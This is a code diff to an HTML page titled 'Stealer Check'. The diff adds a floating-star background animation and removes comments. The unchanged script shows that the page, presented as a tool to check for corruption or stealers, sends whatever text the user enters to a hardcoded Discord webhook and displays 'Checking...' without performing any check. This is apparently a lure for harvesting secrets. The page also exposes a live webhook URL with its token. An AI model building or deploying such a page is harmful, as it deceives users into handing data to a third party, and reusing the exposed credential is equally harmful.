@@ -18,39 +18,76 @@
             margin: 0;
             padding: 1rem; /* Add some padding for smaller screens */
             box-sizing: border-box; /* Include padding in element's total width and height */
+            overflow: hidden; /* Hide overflow to prevent scrollbars from stars */
+            position: relative; /* Needed for absolute positioning of stars */
         }
 
         /* --- Custom Dark Blue Shades --- */
-        /* These are very dark blue shades, almost black, for subtle effect */
-        .custom-bg-darkblue-primary { /* For the main card and input backgrounds */
+        .custom-bg-darkblue-primary {
             background-color: #0A0A10; /* Very dark blue, almost black */
         }
-        .custom-border-darkblue { /* For borders of card and input */
+        .custom-border-darkblue {
             border-color: #121218; /* A shade darker, for subtle distinction */
         }
-        .custom-button-darkblue { /* For the main button background */
-            background-color: #121218; /* Same as border for cohesion */
+        .custom-button-darkblue {
+            background-color: #121218;
         }
-        .custom-button-darkblue:hover { /* Button hover state */
-            background-color: #1A1A22; /* Slightly lighter on hover for feedback */
+        .custom-button-darkblue:hover {
+            background-color: #1A1A22;
         }
-        .custom-focus-ring-blue { /* Focus ring for inputs and buttons */
-            --tw-ring-color: #2c3e50; /* A slightly more visible dark blue for focus */
+        .custom-focus-ring-blue {
+            --tw-ring-color: #2c3e50;
         }
-        .custom-error-bg { /* Error message background */
-            background-color: #8b0000; /* Dark red */
+        .custom-error-bg {
+            background-color: #8b0000;
         }
-        .custom-success-bg { /* Success message background */
-            background-color: #006400; /* Dark green */
+        .custom-success-bg {
+            background-color: #006400;
         }
-        /* Ensure all text remains white */
         .text-white {
             color: #ffffff;
         }
+
+        /* --- Star Animation Styles --- */
+        .stars {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none; /* Allows clicks to pass through stars to content */
+            z-index: -1; /* Ensures stars are behind content */
+        }
+
+        .star {
+            position: absolute;
+            background-color: #ffffff;
+            border-radius: 50%;
+            opacity: 0; /* Starts invisible, then fades in via animation */
+            animation: twinkle 3s infinite ease-in-out alternate,
+                       floatAround 65s infinite linear; /* Changed to LINEAR for constant speed */
+        }
+
+        @keyframes twinkle {
+            0% { opacity: 0; transform: scale(0.5); }
+            5% { opacity: 1; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1); }
+            100% { opacity: 0; transform: scale(0.5); }
+        }
+
+        /* New keyframe for subtle, free floating movement */
+        @keyframes floatAround {
+            0% { transform: translate(0, 0); }
+            25% { transform: translate(calc(var(--rand-x-1) * 1vw), calc(var(--rand-y-1) * 1vh)); }
+            50% { transform: translate(calc(var(--rand-x-2) * 1vw), calc(var(--rand-y-2) * 1vh)); }
+            75% { transform: translate(calc(var(--rand-x-3) * 1vw), calc(var(--rand-y-3) * 1vh)); }
+            100% { transform: translate(0, 0); }
+        }
+
     </style>
 </head>
 <body class="text-white">
-    <div class="custom-bg-darkblue-primary p-8 rounded-lg shadow-xl w-full max-w-md mx-auto border custom-border-darkblue">
+    <div class="stars" id="star-container"></div> <div class="custom-bg-darkblue-primary p-8 rounded-lg shadow-xl w-full max-w-md mx-auto border custom-border-darkblue z-10 relative">
         <h1 class="text-3xl font-bold text-white mb-6 text-center">Stealer Check</h1>
 
         <div class="mb-4">
@@ -79,6 +116,7 @@
         const messageInput = document.getElementById('messageInput');
         const sendButton = document.getElementById('sendButton');
         const messageBox = document.getElementById('messageBox');
+        const starContainer = document.getElementById('star-container');
 
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395524525038501898/NvLWqzSozM0UVmcBWOjPLnFyk8_u0HOv-APeS5kjr6ZwT0kapfpkYuH4b8W7uKBSO7qF';
@@ -94,15 +132,13 @@
          */
         function showMessageBox(message, isError = false) {
             messageBox.textContent = message;
-            messageBox.classList.remove('hidden', 'custom-success-bg', 'custom-error-bg'); // Remove both to reset
+            messageBox.classList.remove('hidden', 'custom-success-bg', 'custom-error-bg');
             if (isError) {
                 messageBox.classList.add('custom-error-bg');
             } else {
                 messageBox.classList.add('custom-success-bg');
             }
-            // Show the message
             messageBox.classList.remove('hidden');
-            // Hide the message after 5 seconds
             setTimeout(() => {
                 messageBox.classList.add('hidden');
             }, 5000);
@@ -114,56 +150,43 @@
             const timeSinceLastClick = currentTime - lastClickTime;
 
             if (timeSinceLastClick < cooldownTime) {
-                // Modified message for cooldown
                 showMessageBox('Please wait 20 seconds before checking any corruption', true);
-                return; // Prevent execution if still on cooldown
+                return;
             }
 
-            const message = messageInput.value.trim(); // Get the text and remove leading/trailing whitespace
+            const message = messageInput.value.trim();
 
-            // Check if the message is empty
             if (!message) {
                 showMessageBox('Please enter a message before Checking.', true);
-                return; // Stop execution if message is empty
+                return;
             }
 
-            // Set the last click time
             lastClickTime = currentTime;
 
-            // Disable the button and show a loading indicator
             sendButton.disabled = true;
             sendButton.textContent = 'Checking...';
-            messageBox.classList.add('hidden'); // Hide previous messages
+            messageBox.classList.add('hidden');
 
             try {
-                // Send the message to the Discord webhook
                 const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({ content: message }), // Discord expects a 'content' field
+                    body: JSON.stringify({ content: message }),
                 });
 
-                // Check if the request was successful
                 if (response.ok) {
                     showMessageBox('Checking...');
-                    messageInput.value = ''; // Clear the input field on success
+                    messageInput.value = '';
                 } else {
                     const errorText = await response.text();
                     showMessageBox(`Failed to check: ${response.status} ${response.statusText}. ${errorText}`, true);
                 }
             } catch (error) {
-                // Catch network errors or other issues
                 showMessageBox(`An error occurred: ${error.message}`, true);
                 console.error('Fetch error:', error);
             } finally {
-                // Re-enable the button regardless of success or failure (after cooldown)
-                // The button will be re-enabled automatically after the cooldown expires
-                // if the user tries to click it again, or they can wait for the next allowed click.
-                // We'll keep it disabled until the cooldown is over or next attempt.
-                // For now, we only enable it if it was disabled due to an error,
-                // otherwise, it remains disabled until the cooldown naturally passes.
                 if (Date.now() - lastClickTime >= cooldownTime) {
                      sendButton.disabled = false;
                      sendButton.textContent = 'Check Corruption';
@@ -171,14 +194,48 @@
             }
         });
 
-        // This interval will re-enable the button once the cooldown is over,
-        // even if the user doesn't try to click it again.
         setInterval(() => {
             if (sendButton.disabled && Date.now() - lastClickTime >= cooldownTime) {
                 sendButton.disabled = false;
                 sendButton.textContent = 'Check Corruption';
             }
-        }, 1000); // Check every second
+        }, 1000);
+
+        // --- Star Generation and Animation Logic for Floating ---
+        const numberOfStars = 80; // Still 200 stars for density
+
+        function createStars() {
+            for (let i = 0; i < numberOfStars; i++) {
+                const star = document.createElement('div');
+                star.classList.add('star');
+
+                // Randomize size
+                const size = Math.random() * 3 + 1; // Stars from 1px to 4px
+                star.style.width = `${size}px`;
+                star.style.height = `${size}px`;
+
+                // Randomize initial position within the viewport
+                star.style.left = `${Math.random() * 100}vw`;
+                star.style.top = `${Math.random() * 100}vh`;
+
+                // Set CSS variables for random translation amounts
+                star.style.setProperty('--rand-x-1', (Math.random() * 100 - 50).toFixed(0)); // -50 to 50 vw
+                star.style.setProperty('--rand-y-1', (Math.random() * 100 - 50).toFixed(0)); // -50 to 50 vh
+                star.style.setProperty('--rand-x-2', (Math.random() * 100 - 50).toFixed(0));
+                star.style.setProperty('--rand-y-2', (Math.random() * 100 - 50).toFixed(0));
+                star.style.setProperty('--rand-x-3', (Math.random() * 100 - 50).toFixed(0));
+                star.style.setProperty('--rand-y-3', (Math.random() * 100 - 50).toFixed(0));
+
+                // Randomize animation delays and durations for variety
+                star.style.animationDelay = `${Math.random() * 0.5}s`;
+                star.style.animationDuration = `${Math.random() * 20 + 50}s`; // Movement duration 50-70s (super slow)
+
+                starContainer.appendChild(star);
+            }
+        }
+
+        // Call the function to create stars when the page loads
+        createStars();
     </script>
 </body>
 </html>
